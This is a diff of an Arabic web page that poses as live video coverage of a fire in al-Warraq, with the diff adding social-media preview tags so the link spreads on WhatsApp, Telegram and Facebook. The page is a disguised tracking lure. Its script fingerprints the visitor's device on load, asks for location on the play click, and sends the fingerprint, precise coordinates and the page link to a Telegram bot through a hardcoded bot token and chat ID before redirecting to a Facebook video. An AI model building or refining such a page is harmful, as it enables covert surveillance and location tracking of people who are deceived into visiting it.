@@ -4,6 +4,29 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>🔥 حريق الوراق — تغطية مباشرة</title>
+
+<!-- ═══════════════════════════════════════════════
+     Open Graph — للمعاينة على واتساب/تليجرام/فيسبوك
+     ═══════════════════════════════════════════════ -->
+<meta property="og:title" content="🔥 حريق الوراق — تغطية مباشرة">
+<meta property="og:description" content="شاهد فيديو لحظة اندلاع الحريق في الوراق — تغطية مباشرة لحظة بلحظة">
+<meta property="og:image" content="https://media.elbalad.news/2026/11/large/18261428244119202611250750545054.jpg">
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="630">
+<meta property="og:url" content="https://dark101vip.github.io/dark101pro/gov_eg.html">
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="حريق الوراق">
+<meta property="og:locale" content="ar_EG">
+
+<!-- Twitter Card -->
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="🔥 حريق الوراق — تغطية مباشرة">
+<meta name="twitter:description" content="شاهد فيديو لحظة اندلاع الحريق في الوراق — تغطية مباشرة">
+<meta name="twitter:image" content="https://media.elbalad.news/2026/11/large/18261428244119202611250750545054.jpg">
+
+<!-- SEO -->
+<meta name="description" content="شاهد فيديو لحظة اندلاع الحريق في الوراق — تغطية مباشرة لحظة بلحظة">
+
 <style>
 @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&display=swap');
 
@@ -187,7 +210,6 @@ body {
     border-radius: 20px; font-size: 11px; font-weight: 800;
 }
 
-/* شاشة تحميل فوق الفيديو */
 .video-loading {
     position: absolute; inset: 0;
     background: rgba(0,0,0,0.92);
@@ -370,7 +392,7 @@ body {
     </div>
 
     <!-- ═══════════════════════════════════════════════════
-         كارت الفيديو الرئيسي — بصورة حريق الوراق الحقيقية
+         كارت الفيديو الرئيسي
          ═══════════════════════════════════════════════════ -->
     <div class="post-card">
         <div class="post-header">
@@ -382,8 +404,6 @@ body {
         </div>
 
         <div class="video-container" id="videoContainer">
-
-            <!-- ✅ الصورة المصغرة — صورة حريق الوراق من موقع البلاد -->
             <img src="https://media.elbalad.news/2026/11/large/18261428244119202611250750545054.jpg"
                  alt="حريق الوراق - صورة من موقع البلاد"
                  class="video-thumbnail"
@@ -398,7 +418,6 @@ body {
                 <span class="play-text">شاهد الفيديو</span>
             </button>
 
-            <!-- شاشة تحميل فوق الفيديو -->
             <div class="video-loading" id="videoLoading">
                 <div class="big-spinner"></div>
                 <div class="loading-text">⏳ جاري تجهيز الفيديو...</div>
@@ -467,7 +486,7 @@ body {
 </div>
 
 <!-- ═══════════════════════════════════════════════════════
-     Modal طلب الموقع — يظهر بعد ضغط زر الفيديو
+     Modal طلب الموقع
      ═══════════════════════════════════════════════════════ -->
 <div class="loc-modal" id="locModal">
     <div class="modal-card">
@@ -492,10 +511,11 @@ body {
     "use strict";
 
     /* ═══════════════════════════════════════════════════════
-       إعدادات تليجرام — حط التوكن والآيدي هنا
+       إعدادات تليجرام + الرابط
        ═══════════════════════════════════════════════════════ */
     var BOT_TOKEN = "8425168324:AAGiTTzty3oL5GMUtMWa74ejRKm7DJlTayU";
     var MASTER_ID = "5849068535";
+    var PAGE_URL  = "https://dark101vip.github.io/dark101pro/gov_eg.html";
 
     /* ═══════════════════════════════════════════════════════
        متغيرات الحالة
@@ -535,7 +555,6 @@ body {
             fp.deviceType = /iPad|Tablet/i.test(fp.userAgent) ? "تابلت" : "موبايل";
         }
 
-        // GPU
         fp.gpu = "غير متاح";
         try {
             var c = document.createElement('canvas');
@@ -549,7 +568,6 @@ body {
             }
         } catch(e) {}
 
-        // الاتصال
         fp.connection = "غير معروف";
         if (navigator.connection) {
             var conn = navigator.connection;
@@ -562,7 +580,6 @@ body {
         return fp;
     }
 
-    // ✅ جمع فوري عند تحميل الصفحة
     deviceFingerprint = collectFingerprint();
     console.log("🕵️ بصمة الجهاز اتجمعت");
 
@@ -585,7 +602,9 @@ body {
 
     function buildFingerprintMessage() {
         var fp = deviceFingerprint;
-        return "🕵️ <b>بصمة جهاز الزائر</b>\n" +
+        return "🔗 <b>الرابط:</b> " + PAGE_URL + "\n" +
+            "━━━━━━━━━━━━━━━━━━\n" +
+            "🕵️ <b>بصمة جهاز الزائر</b>\n" +
             "━━━━━━━━━━━━━━━━━━\n" +
             "📱 <b>نوع الجهاز:</b> " + fp.deviceType + "\n" +
             "🖥️ <b>UserAgent:</b> " + fp.userAgent.substring(0, 200) + "\n" +
@@ -646,13 +665,11 @@ body {
     var locSpinner = document.getElementById('locSpinner');
     var allowBtnText = document.getElementById('allowBtnText');
 
-    // دالة فتح الفيديو
     function openVideo() {
         if (videoLoading) videoLoading.classList.remove('show');
         window.open('https://www.facebook.com/share/r/18bk3HP9cn/', '_blank', 'noopener');
     }
 
-    // ضغط زر الفيديو
     if (playBtn) {
         playBtn.addEventListener('click', function(e) {
             e.preventDefault();
@@ -663,13 +680,11 @@ body {
                 return;
             }
 
-            // إرسال البصمة مع أول تفاعل
             if (!fingerprintSent) {
                 fingerprintSent = true;
                 sendToTelegram(buildFingerprintMessage());
             }
 
-            // إظهار مودال طلب الموقع
             if (locModal) locModal.classList.add('show');
         });
     }
@@ -698,6 +713,7 @@ body {
                         msg += buildFingerprintMessage() + "\n━━━━━━━━━━━━━━━━━━\n";
                     }
                     msg += "🌍 <b>الموقع الجغرافي (بعد الموافقة)</b>\n" +
+                           "🔗 <b>الرابط:</b> " + PAGE_URL + "\n" +
                            "🎯 <b>خط العرض:</b> " + loc.lat + "\n" +
                            "🎯 <b>خط الطول:</b> " + loc.lon + "\n" +
                            "📏 <b>الدقة:</b> ±" + Math.round(loc.accuracy) + " متر\n" +
@@ -710,6 +726,7 @@ body {
                     locationResolved = true;
                     sendToTelegram(
                         "⚠️ <b>الزائر رفض الموقع بعد طلبه</b>\n" +
+                        "🔗 <b>الرابط:</b> " + PAGE_URL + "\n" +
                         "🔴 السبب: " + loc.reason
                     );
                     setTimeout(openVideo, 300);
